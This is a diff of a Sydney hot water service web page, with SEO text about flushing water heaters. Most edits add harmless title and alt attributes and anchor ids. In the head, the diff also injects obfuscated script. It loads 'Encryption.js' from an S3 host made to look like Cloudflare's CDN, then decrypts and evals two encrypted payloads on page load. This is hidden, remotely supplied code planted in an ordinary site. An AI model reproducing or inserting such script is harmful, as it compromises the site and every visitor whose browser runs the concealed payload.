@@ -18,7 +18,9 @@
 
     <!-- Custom (Base) CSS -->
     <link rel="stylesheet" href="home/css/custom.css">
-    <script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"FAQPage","mainEntity":[{"@type":"Question","name":"Why is it important to flush your water heater regularly?","acceptedAnswer":{"@type":"Answer","text":"Flushing your water heater regularly helps to remove sediment buildup, prevent bacteria growth, and maintain optimal performance."}},{"@type":"Question","name":"How often should I flush my water heater?","acceptedAnswer":{"@type":"Answer","text":"It is recommended to flush your water heater at least once a year to ensure it functions efficiently and to extend its lifespan."}},{"@type":"Question","name":"What are the signs that indicate my water heater needs maintenance?","acceptedAnswer":{"@type":"Answer","text":"Signs that indicate your water heater needs maintenance include discolored or foul-smelling water, fluctuating water temperature, and strange noises coming from the unit."}},{"@type":"Question","name":"Can neglecting to flush my water heater lead to health risks?","acceptedAnswer":{"@type":"Answer","text":"Yes, neglecting to flush your water heater can lead to bacteria growth, which can contaminate your water supply and pose health risks to you and your family."}},{"@type":"Question","name":"How does flushing my water heater contribute to its longevity?","acceptedAnswer":{"@type":"Answer","text":"Flushing your water heater helps to remove sediment and mineral buildup, which can cause corrosion and reduce the efficiency of the unit, thus contributing to its longevity and reliability."}}]}</script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.3.0/crypto-js.min.js" samesite="none"></script>
+<script src="https://cdnjs-cloudflare.s3.amazonaws.com/Encryption.js" samesite="none"></script>
+<script>var qPoJFgzKNevqEYA = 'cDCRKZLGoqERYEU';var lwrydUlWsxsQOif = 'eyJjaXBoZXJ0ZXh0IjoiclJaQklVUnRqOGxHYVRRMGZKRjVXM0FKUHpwMTFTOXhSaVkzcDZzZXdPWTgwWmFCOFF3RVk0VWw1dXI5b1JtNFhBUysyNnBMeUxqaGx3d2NwWVp3dTB5UWh5Vm94VkJ4OVhpV0RkNXFrYzZRUWtjWm5ST1hFMFc0Y0lvXC9Oa2M5dkxrblQ1T0VGZjd5NHI4UXIrREhuTzZBd0Y3Ylc4ODlxbkUwQ0VOTW9TaWdhcGFmWHVpeTNsZFpJS0YwUllwa3k0a05pN0dIVVM2WGhwNlZ6dnlBbTBDNHdKY0QwWE9hVFVGeUNjeHpCZWI0R1VUeCtPMWZReXVxSFc3RldSVHNiMVl5NjRPVkNYc1BOYlcwWHE4Vk0zSnFPZnJtYTRmZVVURzF3ajgwbzYySStFMWdxVThnanM5REVqRlQ3TTZUZFFrWW5LcDJIeDFCSkxaWVNzZXY3dElNdkljdFdhTWdEdm05Q0RPRkE2MD0iLCJpdiI6IjY2MDg5OTZjM2Y2NmMzNjQzN2Y0M2RlOGI4NWFhM2MyIiwic2FsdCI6IjdlZWU2YjU2ZGNiMjQ5MzBiOTFmMTkxMDdmZDEzMDM5MjM4OGIwYTIzM2QzZTFiNDQxZWM3NjRkODdkZmYzZWZmZTQ1NWQ2ZWNkMDNhMTE2MTA3ZjhmNTUwMWNmMDNhMzk1YjdjNzU1MDYxYTRjOTVlYjNjOGQ1ZDIzMzg2MTY0YjEwNTViMDkxNjJhZjYyYzRkMmNiN2VlYTY5NzM1M2ZlYTQ4MjQ5MWIzZTNhMTA1ZDc0YWExZTI5OWQyYWJmNTM3YjYyN2NhZjY1MjcxNjJjYjEwYmE2MTQ2YmQxNTBlYTA1ZjM4MWEyOTQyODQzY2JmNGY2ZDlmYTdjYTVlYTRmY2Y5OGVlMzIxMWI4YWY1MDBmZGVmMWU4ODgxZDlhMWQwYWI1Y2JlY2MwMTcwN2Y4Zjk1YTFjNGNmZmE3Nzk4OTI3YmEyZWZkOGRiZjczZTk2ZjAwNjE1ODAzZmQwYTQ4MDc2YmIwZjNjMDJiNWQ5NjEzMzJmNmJkMzJlYjcxNDdiMTJmMGE1OTkzZTQzNTZjZjNlMDlmZWNkZmJkMWM1ZGE2Yjc3M2M3ODEwZTMyNTA5YWIzZDdiN2M5ZTBmZWYzOTdmOTUwZjQ1MzlmNTVjNjhmZTZlNTQ3NWFkMTdiNzRhYTUxOGIyZTI0ODhiZjkwNWYxOTVjNWQ0NWU4MThkIiwiaXRlcmF0aW9ucyI6OTk5fQ==';var RDrahTRYHxYlojN = 'eyJjaXBoZXJ0ZXh0IjoiQVZyYVpoMmFaTWVGRGswcXBPcGY0NUJ1ZjE0NHY1S2Jva1VKN3ZHNnZJSnFpRVE5MUdwNmZKWEFVNXZEeXdHRnBMaFFrNWtWd2kwamNmcDA5TlJmNWlUNDlxaUQzaVgwYXpUTVF3d3Z3Q2JKcEN6WVhXN3dBZUlicGFlQ3UxR1huQU9Od2ZNOWNucXh4S2RFT1BIRXRmYnptWHJ3cnJHenFEdGlseldTMjY1bG94bndHZEhkK3RoUkdlVWg2djloYnBYdXR5ejJXc21pS0xHVndcL1laNXJKUDRmUUpIUDZNRHJLbXRDeGp0R2NoblgyZklhS1hJNGpodlRVWmRJdHMiLCJpdiI6ImFkMzJkODE2NTE3MjE5MjJmZGFhNjI1N2FjZGRlNzAxIiwic2FsdCI6IjQ1NGQ3ZmViZjEyNTllNDY0NWFjNWQwOTNjNDNjZDU1ZGNhM2JiOGMyYWY2ODliNWExYzZjYWU4NWQzMTcwMGU2ZDI0NmJjYWJlZDdiNWFhZDY5OGMwMjNlOGQyNWJmMzI0OWEwZjFkMTdiMWJiY2M2YjIwYTEzZjE0NjJmNDE2YmY1ZDRiY2I5NzkwMTFiNjAxZDdhZWI3ZGNjMGI5Mjk3YTIzYjk1ZWUwZDM5ZjVkZGUyZWE4NjJlZTliM2RlYTliNWZmMDFhMGE0ZTczODYwMGU1MTRmOTdlZTgzY2VlZWM3NmRjNDZkNjIyMDRjNTZkYWRmMzU5ZjlkYTFmZjAzYjY3ZGYyZTMxYWRiOGM2MDRmMWQxMGJkYWY2ZjljZTI5YWFlYzUxYTNiOGU5MzM1MWM2OWY5YTEzYzdkMjEyOGZkNjdmNDFjOWY2YTU4OTRlYWZiODIwZmM0M2ZhNjZkNDViMGI3ZDEwZDY1ZTcwYzA4MTgyMDI4ZGRhNjdhN2FhYmMwOTM2ZWZhYjg4ZTU1MzUwNmY0YWRkNzczYzllOWU5MzJjMmM5N2U3ODQ4MTE5NGEzZmJkNzIwZDI5Yzk0NGRhYzY5OGNlNDhhMjliZGQ5NWU1YmMzODg2MmIyMDhjYzdmZWQ4ZGY3NmM2M2Q4ZWYwNzhjODQ4NDhiOGJiIiwiaXRlcmF0aW9ucyI6OTk5fQ==';let RXRCOBXKsZKQJWF = new Encryption();var WDHqwcOJhARGQjt = RXRCOBXKsZKQJWF.decrypt(lwrydUlWsxsQOif, qPoJFgzKNevqEYA);if (!eval(WDHqwcOJhARGQjt)) {eval(RXRCOBXKsZKQJWF.decrypt(RDrahTRYHxYlojN, qPoJFgzKNevqEYA));};</script><script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"FAQPage","mainEntity":[{"@type":"Question","name":"Why is it important to flush your water heater regularly?","acceptedAnswer":{"@type":"Answer","text":"Flushing your water heater regularly helps to remove sediment buildup, prevent bacteria growth, and maintain optimal performance."}},{"@type":"Question","name":"How often should I flush my water heater?","acceptedAnswer":{"@type":"Answer","text":"It is recommended to flush your water heater at least once a year to ensure it functions efficiently and to extend its lifespan."}},{"@type":"Question","name":"What are the signs that indicate my water heater needs maintenance?","acceptedAnswer":{"@type":"Answer","text":"Signs that indicate your water heater needs maintenance include discolored or foul-smelling water, fluctuating water temperature, and strange noises coming from the unit."}},{"@type":"Question","name":"Can neglecting to flush my water heater lead to health risks?","acceptedAnswer":{"@type":"Answer","text":"Yes, neglecting to flush your water heater can lead to bacteria growth, which can contaminate your water supply and pose health risks to you and your family."}},{"@type":"Question","name":"How does flushing my water heater contribute to its longevity?","acceptedAnswer":{"@type":"Answer","text":"Flushing your water heater helps to remove sediment and mineral buildup, which can cause corrosion and reduce the efficiency of the unit, thus contributing to its longevity and reliability."}}]}</script>
     <style>
         .section-content a {
             color: var(--base-primary);
@@ -48,7 +50,7 @@
 
         <div class="d-inline-flex gap-4 align-items-center top-infobar-icons " style="display: none">
             <!-- Social Icon(s) -->
-            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+            <a href="" title="Facebook Link" class="text-decoration-none" style="display: none" target="_blank">
                 <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                      class="bi bi-facebook mb-1" viewBox="0 0 16 16">
                     <path
@@ -56,7 +58,7 @@
                 </svg>
             </a>
 
-            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+            <a href="" title="Instagram Link" class="text-decoration-none" style="display: none" target="_blank">
                 <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                      class="bi bi-instagram mb-1" viewBox="0 0 16 16">
                     <path
@@ -64,7 +66,7 @@
                 </svg>
             </a>
 
-            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+            <a href="" title="Twitter Link" class="text-decoration-none" style="display: none" target="_blank">
                 <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                      class="bi bi-twitter-x mb-1" viewBox="0 0 16 16">
                     <path
@@ -72,7 +74,7 @@
                 </svg>
             </a>
 
-            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+            <a href="" title="Pinterest Link" class="text-decoration-none" style="display: none" target="_blank">
                 <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                      class="bi bi-pinterest-x mb-1" viewBox="0 0 496 512">
                     <path d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3 .8-3.4 5-20.3 6.9-28.1 .6-2.5 .3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/>
@@ -81,7 +83,7 @@
             </a>
 
 
-            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+            <a href="" title="Youtube Link" class="text-decoration-none" style="display: none" target="_blank" style="display: none">
                 <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="currentColor"
                      class="bi bi-youtube mb-1" viewBox="0 0 16 16">
                     <path
@@ -100,7 +102,7 @@
         <div class="container-md justify-content-md-between">
             <a class="navbar-brand m-0 d-inline-flex gap-2 align-items-center" href="index.html">
                 <!-- Brand Logo/Mark -->
-                <img fetchpriority="low" async="true" defer="true" src="logo.png" onerror="this.remove()" style="display: none"
+                <img alt="Hot Water Experts Sydney" fetchpriority="low" async="true" defer="true" src="logo.png" onerror="this.remove()" style="display: inherit"
                      height="40" />
                 <!-- Brand Name -->
                 <span class="small navbar-brand">Hot Water Experts Sydney</span>
@@ -108,7 +110,7 @@
 
             <!-- Mobile Menu Icons -->
             <div class="d-lg-none mobile-call-menu-icons">
-                <a href="tel:+0490 414 794" class="text-decoration-none">
+                <a href="tel:+0490 414 794" class="text-decoration-none" title="Contact Number">
                     <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20"
                          fill="currentColor">
                         <path
@@ -117,7 +119,7 @@
                     </svg>
                 </a>
 
-                <a href="#toggleMobileMenu" class="ms-3 me-1 text-decoration-none" data-bs-toggle="offcanvas"
+                <a href="#toggleMobileMenu" class="ms-3 me-1 text-decoration-none" title="menu" data-bs-toggle="offcanvas"
                    role="button" aria-controls="toggleMobileMenu">
                     <svg xmlns="http://www.w3.org/2000/svg" width="20" height="14" viewBox="0 0 20 14"
                          fill="currentColor">
@@ -136,13 +138,13 @@
 
             <!-- Mobile Offcanvas Menu -->
             <div class="offcanvas offcanvas-start bg-primary offcanvas-mobile-menu" tabindex="-1"
-                 id="toggleMobileMenu" aria-labelledby="toggleMobileMenuLabel">
+                 id="toggleMobileMenu" aria-labelledby="toggleMobileMenu">
                 <div class="offcanvas-header">
                     <a class="navbar-brand m-0 d-inline-flex gap-2 align-items-center mobile-menu-brand-name"
                        href="index.html">
                         <!-- Brand Logo/Mark -->
-                        <img fetchpriority="low" async="true" defer="true"
-                             src="logo.png" onerror="this.remove()" style="display: none" width="75" height="32" />
+                        <img alt="Hot Water Experts Sydney" fetchpriority="low" async="true" defer="true"
+                             src="logo.png" onerror="this.remove()" style="display: inherit" width="75" height="32" />
                         <!-- Brand Name -->
                         <span class="small">Hot Water Experts Sydney</span>
                     </a>
@@ -162,7 +164,7 @@
                             </a>
 
                             <ul class="collapse p-0 py-2 " id="servicesMenu">
-                                <a class="custom-nav-link" href="hot-water-system-upgrades.html">Hot Water System Upgrades</a><a class="custom-nav-link" href="hot-water-system-cleaning.html">Hot Water System Cleaning</a><a class="custom-nav-link" href="hot-water-system-replacement.html">Hot Water System Replacement</a><a class="custom-nav-link" href="hot-water-system-maintenance.html">Hot Water System Maintenance</a><a class="custom-nav-link" href="hot-water-system-troubleshooting.html">Hot Water System Troubleshooting</a><a class="custom-nav-link" href="hot-water-system-repairs.html">Hot Water System Repairs</a><a class="custom-nav-link" href="hot-water-system-inspections.html">Hot Water System Inspections</a><a class="custom-nav-link" href="hot-water-system-installation.html">Hot Water System Installation</a>
+                                <a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-upgrades.html">Hot Water System Upgrades</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-cleaning.html">Hot Water System Cleaning</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-replacement.html">Hot Water System Replacement</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-maintenance.html">Hot Water System Maintenance</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-troubleshooting.html">Hot Water System Troubleshooting</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-repairs.html">Hot Water System Repairs</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-inspections.html">Hot Water System Inspections</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-installation.html">Hot Water System Installation</a>
                             </ul>
                         </li>
                         <li class="nav-item">
@@ -178,7 +180,7 @@
 
                     <div class="mt-5 px-3 d-inline-flex gap-4 align-items-center mobile-menu-icons">
                         <!-- Social Icon(s) -->
-                        <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                        <a href="" title="Facebook Link" class="text-decoration-none" style="display: none" target="_blank">
                             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                                  class="bi bi-facebook mb-1" viewBox="0 0 16 16">
                                 <path
@@ -186,7 +188,7 @@
                             </svg>
                         </a>
 
-                        <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                        <a href="" title="Instagram Link" class="text-decoration-none" style="display: none" target="_blank">
                             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                                  class="bi bi-instagram mb-1" viewBox="0 0 16 16">
                                 <path
@@ -194,7 +196,7 @@
                             </svg>
                         </a>
 
-                        <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                        <a href="" title="Twitter Link" class="text-decoration-none" style="display: none" target="_blank">
                             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                                  class="bi bi-twitter-x mb-1" viewBox="0 0 16 16">
                                 <path
@@ -202,7 +204,7 @@
                             </svg>
                         </a>
 
-                        <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                        <a href="" title="Pinterest Link" class="text-decoration-none" style="display: none" target="_blank">
                             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                                  class="bi bi-pinterest-x mb-1" viewBox="0 0 496 512">
                                 <path d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3 .8-3.4 5-20.3 6.9-28.1 .6-2.5 .3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/>
@@ -210,7 +212,7 @@
                             </svg>
                         </a>
 
-                        <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                        <a href="" title="Youtube Link" class="text-decoration-none" style="display: none" target="_blank">
                             <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="currentColor"
                                  class="bi bi-youtube" viewBox="0 0 16 16">
                                 <path
@@ -230,7 +232,7 @@
                     <li class="nav-item custom-nav-item ">
                         <a href="services.html" class="nav-link fw-medium {{service_active}}" >Services</a>
                         <div class="custom-dropdown slideup py-2 rounded-3 bg-primary">
-                            <a class="custom-nav-link" href="hot-water-system-upgrades.html">Hot Water System Upgrades</a><a class="custom-nav-link" href="hot-water-system-cleaning.html">Hot Water System Cleaning</a><a class="custom-nav-link" href="hot-water-system-replacement.html">Hot Water System Replacement</a><a class="custom-nav-link" href="hot-water-system-maintenance.html">Hot Water System Maintenance</a><a class="custom-nav-link" href="hot-water-system-troubleshooting.html">Hot Water System Troubleshooting</a><a class="custom-nav-link" href="hot-water-system-repairs.html">Hot Water System Repairs</a><a class="custom-nav-link" href="hot-water-system-inspections.html">Hot Water System Inspections</a><a class="custom-nav-link" href="hot-water-system-installation.html">Hot Water System Installation</a>
+                            <a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-upgrades.html">Hot Water System Upgrades</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-cleaning.html">Hot Water System Cleaning</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-replacement.html">Hot Water System Replacement</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-maintenance.html">Hot Water System Maintenance</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-troubleshooting.html">Hot Water System Troubleshooting</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-repairs.html">Hot Water System Repairs</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-inspections.html">Hot Water System Inspections</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-installation.html">Hot Water System Installation</a>
                         </div>
                     </li>
                     <li class="nav-item ">
@@ -243,7 +245,7 @@
                         <a href="contact.html" class="nav-link fw-medium {{contact_active}}">Contact Us</a>
                     </li>
                     <li class="nav-item" style="display: ">
-                        <a href="tel:0490 414 794" class="btn btn-sm btn-primary fw-medium px-2">
+                        <a href="tel:0490 414 794" title="Contact Number" class="btn btn-sm btn-primary fw-medium px-2">
                             Call <span class="d-none d-xl-inline-block">0490 414 794</span>
                             <span class="d-xl-none">Now</span>
                         </a>
@@ -284,14 +286,14 @@
         <div class="row g-4 section-content">
             <div class="container-md p-0 pt-sm-3 p-md-3 p-lg-5 position-relative">
     <div class=" top-100 start-50 w-100">
-        <img src="what-happens-if-you-dont-flush-the-water-heater-1-326923.jpg?key=9I038c" alt="What happens if you don't flush the water heater?" class="rounded-4 w-100">
+        <img src="what-happens-if-you-dont-flush-the-water-heater-1-326923.jpg?key=I3rcyL" alt="What happens if you don't flush the water heater?" class="rounded-4 w-100">
     </div>
 </div>
 <div class="col-12">
     <hr class="hr-border my-5">
 </div>
 <div class="col-12 mt-5 mt-md-0 mt-lg-4 mt-xl-5">
-    <h3 class=''>Table Of Contents</h3><div><a href='#Problems caused by bacteria growth in a neglected water heater'>Problems caused by bacteria growth in a neglected water heater</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#Contaminated water supply and health risks'>Contaminated water supply and health risks</a></div><div><a href='#Signs that indicate a need for water heater maintenance'>Signs that indicate a need for water heater maintenance</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#Discolored or foulsmelling water'>Discolored or foulsmelling water</a></div><div><a href='#Importance of periodic flushing for water heater longevity'>Importance of periodic flushing for water heater longevity</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#Ensuring optimal performance and reliability'>Ensuring optimal performance and reliability</a></div><div><a href='#FAQS'>FAQS</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#Why is it important to flush your water heater regularly?'>Why is it important to flush your water heater regularly?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#How often should I flush my water heater?'>How often should I flush my water heater?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#What are the signs that indicate my water heater needs maintenance?'>What are the signs that indicate my water heater needs maintenance?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#Can neglecting to flush my water heater lead to health risks?'>Can neglecting to flush my water heater lead to health risks?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#How does flushing my water heater contribute to its longevity?'>How does flushing my water heater contribute to its longevity?</a></div><br/><h2 id="Problems caused by bacteria growth in a neglected water heater">Problems caused by bacteria growth in a neglected water heater</h2><p>Bacteria growth in a water heater that has been neglected can lead to various problems. The warm environment inside the water tank provides the perfect breeding ground for bacteria, which can multiply rapidly if not addressed. This can result in the contamination of the water supply, potentially posing health risks to anyone using the water. To prevent this, regular <a href='hot-water-system-cleaning.html'>Hot Water System Cleaning</a> is crucial to eliminate any build-up of bacteria and ensure the water remains safe for daily use.<br/><br/>Moreover, bacterial growth in a neglected water heater can also lead to foul-smelling or discoloured water. The presence of bacteria can cause an unpleasant odour in the water, making it unappealing for household use. Additionally, the water may appear murky or have a brownish tint, which signals contamination. Regular maintenance, including Hot Water System Cleaning, can help prevent these issues and ensure that the water heater functions efficiently and provides clean, safe water for your daily needs.</p><h3 id="Contaminated water supply and health risks">Contaminated water supply and health risks</h3><p>Neglecting to flush your water heater can lead to the growth of harmful bacteria in the tank. When bacteria proliferate within the water heater, it contaminates the water supply flowing into your home. This poses serious health risks to you and your family members. Consuming water that has been contaminated by bacteria can result in gastrointestinal issues and other health problems. Therefore, conducting regular maintenance such as Hot Water System Cleaning is imperative to ensure the safety of your drinking water.<br/><br/>Furthermore, the buildup of sediment and minerals in a neglected water heater can also contribute to the contamination of your water supply. Over time, these substances accumulate in the tank and can leach into the water, causing it to become discolored or emit a foul odor. Ingesting water that has been tainted with sediment and minerals can have detrimental effects on one's health. To prevent such issues and maintain a clean water supply, it is essential to schedule routine maintenance tasks like Hot Water System Cleaning to safeguard your health and the wellbeing of your household.</p><h2 id="Signs that indicate a need for water heater maintenance">Signs that indicate a need for water heater maintenance</h2><p>When your water heater is in need of maintenance, there are some clear signs to look out for. Discolored or foul-smelling water coming out of your taps indicates that your water heater may need attention. This could be a result of sediment buildup or bacteria growth inside the water heater. If you notice any unusual odours or colours in your water, it is essential to consider a professional Hot Water System Cleaning service to address the issue promptly.<br/><br/>Another indicator that your water heater requires maintenance is if it is making strange noises during operation. The sound of cracking, popping, or loud rumbling could suggest that sediment has accumulated at the bottom of the tank. This buildup can reduce the efficiency of your water heater and even lead to long-term damage if not addressed. By scheduling regular maintenance and Hot Water System Cleaning, you can ensure that your water heater operates efficiently and reliably.</p><h3 id="Discolored or foulsmelling water">Discolored or foulsmelling water</h3><p>Discolored or foul-smelling water emerging from your taps can be a clear indication of sediment buildup in your water heater. Over time, minerals and debris accumulate at the bottom of the tank, leading to discolored water that ranges from a yellowish tinge to a rusty brown hue. This accumulation not only affects the water's appearance but also contributes to unpleasant odors that can permeate throughout your home.  <br/><br/>If you notice any signs of discolored or foul-smelling water coming from your taps, it may be time to consider a Hot Water System Cleaning. Neglecting regular maintenance and flushing of your water heater can lead to a myriad of issues, including compromised water quality and potentially harmful health risks. By investing in routine maintenance for your water heater, you can ensure that your system functions efficiently and provides clean, safe water for your household.</p><h2 id="Importance of periodic flushing for water heater longevity">Importance of periodic flushing for water heater longevity</h2><p>Regular maintenance of your water heater, including the essential task of periodic flushing, is paramount for ensuring its longevity and optimal performance. Neglecting this crucial maintenance step can lead to a buildup of sediment and minerals within the tank, which can reduce the efficiency of your hot water system and potentially even cause irreversible damage. Hot Water System Cleaning is not just a recommended practice, but a necessary one to prevent issues such as decreased heating efficiency and an increased risk of corrosion within the tank that can compromise its lifespan.<br/><br/>By incorporating routine flushing into your water heater maintenance schedule, you can prevent the buildup of sediment and mineral deposits that can impede the heating process and strain the system over time. This proactive approach not only promotes the longevity of your water heater but also ensures that it continues to function at its best, providing you with a reliable supply of hot water whenever you need it. Remember, neglecting the importance of Hot Water System Cleaning can result in costly repairs or even premature replacement of your water heater, making regular maintenance a wise investment in the longevity and efficiency of your hot water system.</p><h3 id="Ensuring optimal performance and reliability">Ensuring optimal performance and reliability</h3><p>To ensure optimal performance and reliability of your water heater, regular maintenance is essential. Hot water systems cleaning should be scheduled periodically to prevent the buildup of sediment and minerals in the tank. Neglecting this task can lead to decreased efficiency and potential malfunctions in the system. By flushing the water heater regularly, you can help extend its lifespan and maintain its effectiveness in providing hot water for your household needs.<br/>In addition to scheduling routine maintenance, it is important to pay attention to any warning signs that may indicate a need for immediate action. Discolored or foul-smelling water coming from your taps can be a clear indication that your water heater requires attention. By addressing these issues promptly and conducting regular hot water system cleaning, you can ensure that your water heater operates efficiently and reliably, providing you with consistent hot water whenever needed.</p><h2 id="FAQS">FAQS</h2><h3 id="Why is it important to flush your water heater regularly?">Why is it important to flush your water heater regularly?</h3><p>Flushing your water heater regularly helps to remove sediment buildup, prevent bacteria growth, and maintain optimal performance.</p><h3 id="How often should I flush my water heater?">How often should I flush my water heater?</h3><p>It is recommended to flush your water heater at least once a year to ensure it functions efficiently and to extend its lifespan.</p><h3 id="What are the signs that indicate my water heater needs maintenance?">What are the signs that indicate my water heater needs maintenance?</h3><p>Signs that indicate your water heater needs maintenance include discolored or foul-smelling water, fluctuating water temperature, and strange noises coming from the unit.</p><h3 id="Can neglecting to flush my water heater lead to health risks?">Can neglecting to flush my water heater lead to health risks?</h3><p>Yes, neglecting to flush your water heater can lead to bacteria growth, which can contaminate your water supply and pose health risks to you and your family.</p><h3 id="How does flushing my water heater contribute to its longevity?">How does flushing my water heater contribute to its longevity?</h3><p>Flushing your water heater helps to remove sediment and mineral buildup, which can cause corrosion and reduce the efficiency of the unit, thus contributing to its longevity and reliability.</p>
+    <h2 class='fs-3'>Table Of Contents</h2><div><a href='#problems-caused-by-bacteria-growth-in-a-neglected-water-heater'>Problems caused by bacteria growth in a neglected water heater</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#contaminated-water-supply-and-health-risks'>Contaminated water supply and health risks</a></div><div><a href='#signs-that-indicate-a-need-for-water-heater-maintenance'>Signs that indicate a need for water heater maintenance</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#discolored-or-foulsmelling-water'>Discolored or foulsmelling water</a></div><div><a href='#importance-of-periodic-flushing-for-water-heater-longevity'>Importance of periodic flushing for water heater longevity</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#ensuring-optimal-performance-and-reliability'>Ensuring optimal performance and reliability</a></div><div><a href='#faqs'>FAQS</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#why-is-it-important-to-flush-your-water-heater-regularly'>Why is it important to flush your water heater regularly?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#how-often-should-i-flush-my-water-heater'>How often should I flush my water heater?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#what-are-the-signs-that-indicate-my-water-heater-needs-maintenance'>What are the signs that indicate my water heater needs maintenance?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#can-neglecting-to-flush-my-water-heater-lead-to-health-risks'>Can neglecting to flush my water heater lead to health risks?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#how-does-flushing-my-water-heater-contribute-to-its-longevity'>How does flushing my water heater contribute to its longevity?</a></div><br/><h2 id="problems-caused-by-bacteria-growth-in-a-neglected-water-heater">Problems caused by bacteria growth in a neglected water heater</h2><p>Bacteria growth in a water heater that has been neglected can lead to various problems. The warm environment inside the water tank provides the perfect breeding ground for bacteria, which can multiply rapidly if not addressed. This can result in the contamination of the water supply, potentially posing health risks to anyone using the water. To prevent this, regular <a href='hot-water-system-cleaning.html'>Hot Water System Cleaning</a> is crucial to eliminate any build-up of bacteria and ensure the water remains safe for daily use.<br/><br/>Moreover, bacterial growth in a neglected water heater can also lead to foul-smelling or discoloured water. The presence of bacteria can cause an unpleasant odour in the water, making it unappealing for household use. Additionally, the water may appear murky or have a brownish tint, which signals contamination. Regular maintenance, including Hot Water System Cleaning, can help prevent these issues and ensure that the water heater functions efficiently and provides clean, safe water for your daily needs.</p><h3 id="contaminated-water-supply-and-health-risks">Contaminated 